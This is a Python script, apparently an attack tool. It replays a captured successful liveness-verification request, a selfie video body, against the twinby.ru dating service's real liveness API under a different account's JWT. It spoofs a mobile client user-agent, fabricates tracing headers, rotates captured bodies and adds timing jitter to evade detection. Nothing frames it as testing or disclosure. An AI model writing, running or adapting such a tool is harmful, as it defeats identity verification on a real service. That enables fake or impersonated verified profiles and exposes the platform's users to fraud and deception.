#!/usr/bin/env python3
"""
Twinby liveness verification replay tool.
Takes a captured successful request body (multipart MP4 with valid twpd)
and replays it with a different JWT token.

Usage:
  python3 replay_liveness.py --jwt <token> --body <path_to_body_file>
  python3 replay_liveness.py --jwt <token>   # uses default v2_2 body

Multiple saved bodies can be rotated with --body-dir <dir>.
"""

import argparse
import os
import sys
import uuid
import time
import random
import ssl
import http.client
import json


TWINBY_HOST = "twinby.ru"
LIVENESS_PATH = "/api/photo/liveness/v2"

# Default body file (the one we already have)
DEFAULT_BODY = "/mnt/user-data/uploads/1a4f1d39-v2_2"

# Headers that stay the same across replays
STATIC_HEADERS = {
    "user-agent": "Dart/3.11 (dart:io)",
    "accept": "application/json",
    "accept-language": "en",
}


def extract_boundary(body: bytes) -> str:
    """Extract the multipart boundary from the body."""
    # Body starts with --<boundary>\r\n
    first_line_end = body.find(b"\r\n")
    if first_line_end < 0:
        raise ValueError("Cannot find boundary in body")
    boundary_line = body[:first_line_end].decode("ascii")
    if not boundary_line.startswith("--"):
        raise ValueError(f"Body doesn't start with --: {boundary_line[:80]}")
    return boundary_line[2:]  # strip the leading --


def make_sentry_trace() -> str:
    """Generate a plausible sentry-trace header."""
    trace_id = uuid.uuid4().hex
    span_id = uuid.uuid4().hex[:16]
    return f"{trace_id}-{span_id}-0"


def send_replay(jwt_token: str, body: bytes, boundary: str,
                verbose: bool = False) -> tuple[int, dict | str]:
    """
    Send the liveness verification request.
    Returns (status_code, response_body).
    """
    idempotency_key = str(uuid.uuid4())
    sentry_trace = make_sentry_trace()

    headers = {
        **STATIC_HEADERS,
        "authorization": f"JWT {jwt_token}",
        "idempotency-key": idempotency_key,
        "content-type": f"multipart/form-data; boundary={boundary}",
        "sentry-trace": sentry_trace,
        "content-length": str(len(body)),
    }

    if verbose:
        print(f"[>] POST https://{TWINBY_HOST}{LIVENESS_PATH}")
        print(f"    JWT: ...{jwt_token[-20:]}")
        print(f"    Idempotency-Key: {idempotency_key}")
        print(f"    Body size: {len(body)} bytes")
        print(f"    Boundary: {boundary[:40]}...")

    # Use HTTPS
    ctx = ssl.create_default_context()
    # Try system CA first, fall back to ccr bundle
    ca_bundle = os.path.expanduser("~/.ccr/ca-bundle.crt")
    if os.path.exists(ca_bundle):
        ctx.load_verify_locations(ca_bundle)

    conn = http.client.HTTPSConnection(TWINBY_HOST, 443, timeout=30, context=ctx)

    try:
        conn.request("POST", LIVENESS_PATH, body=body, headers=headers)
        resp = conn.getresponse()
        status = resp.status
        resp_body = resp.read()
        resp_headers = dict(resp.getheaders())

        if verbose:
            print(f"[<] Status: {status}")
            print(f"    Headers: {json.dumps(resp_headers, indent=2, ensure_ascii=False)}")

        try:
            parsed = json.loads(resp_body)
        except (json.JSONDecodeError, UnicodeDecodeError):
            parsed = resp_body.decode("utf-8", errors="replace")

        return status, parsed
    finally:
        conn.close()


def load_bodies(body_path: str = None, body_dir: str = None) -> list[tuple[str, bytes]]:
    """Load one or more request bodies. Returns list of (name, body_bytes)."""
    bodies = []

    if body_dir and os.path.isdir(body_dir):
        for fname in sorted(os.listdir(body_dir)):
            fpath = os.path.join(body_dir, fname)
            if os.path.isfile(fpath) and os.path.getsize(fpath) > 10000:
                with open(fpath, "rb") as f:
                    data = f.read()
                # Quick sanity: must start with --
                if data[:2] == b"--":
                    bodies.append((fname, data))
                    print(f"[+] Loaded body: {fname} ({len(data)} bytes)")
        if not bodies:
            print(f"[!] No valid body files found in {body_dir}")
            sys.exit(1)
    else:
        path = body_path or DEFAULT_BODY
        if not os.path.exists(path):
            print(f"[!] Body file not found: {path}")
            sys.exit(1)
        with open(path, "rb") as f:
            data = f.read()
        bodies.append((os.path.basename(path), data))
        print(f"[+] Loaded body: {path} ({len(data)} bytes)")

    return bodies


def main():
    parser = argparse.ArgumentParser(description="Twinby liveness replay tool")
    parser.add_argument("--jwt", required=True, help="JWT token for the target account")
    parser.add_argument("--body", help=f"Path to captured request body (default: {DEFAULT_BODY})")
    parser.add_argument("--body-dir", help="Directory with multiple body files to rotate")
    parser.add_argument("--count", type=int, default=1, help="Number of attempts (default: 1)")
    parser.add_argument("--delay", type=float, default=2.0, help="Delay between attempts in seconds (default: 2)")
    parser.add_argument("-v", "--verbose", action="store_true", help="Verbose output")
    args = parser.parse_args()

    jwt = args.jwt.strip()
    if jwt.startswith("JWT "):
        jwt = jwt[4:]

    bodies = load_bodies(args.body, args.body_dir)

    print(f"\n{'='*60}")
    print(f"Twinby Liveness Replay")
    print(f"Target: https://{TWINBY_HOST}{LIVENESS_PATH}")
    print(f"Bodies loaded: {len(bodies)}")
    print(f"Attempts: {args.count}")
    print(f"{'='*60}\n")

    success_count = 0
    fail_count = 0

    for i in range(args.count):
        # Pick a body (rotate if multiple)
        name, body = bodies[i % len(bodies)]
        try:
            boundary = extract_boundary(body)
        except ValueError as e:
            print(f"[!] Error with body {name}: {e}")
            continue

        print(f"\n--- Attempt {i+1}/{args.count} (body: {name}) ---")

        try:
            status, response = send_replay(jwt, body, boundary, verbose=args.verbose)
        except Exception as e:
            print(f"[!] Request failed: {e}")
            fail_count += 1
            if i + 1 < args.count:
                time.sleep(args.delay)
            continue

        if isinstance(response, dict):
            resp_str = json.dumps(response, indent=2, ensure_ascii=False)
        else:
            resp_str = str(response)

        if status == 200:
            print(f"[+] SUCCESS (200)")
            print(f"    Response: {resp_str}")
            success_count += 1
        elif status == 422:
            print(f"[-] REJECTED (422)")
            print(f"    Response: {resp_str}")
            fail_count += 1
        else:
            print(f"[?] Status {status}")
            print(f"    Response: {resp_str[:500]}")
            fail_count += 1

        if i + 1 < args.count:
            jitter = random.uniform(0, args.delay * 0.3)
            wait = args.delay + jitter
            print(f"    Waiting {wait:.1f}s...")
            time.sleep(wait)

    print(f"\n{'='*60}")
    print(f"Results: {success_count} success, {fail_count} failed, {args.count} total")
    print(f"{'='*60}")


if __name__ == "__main__":
    main()
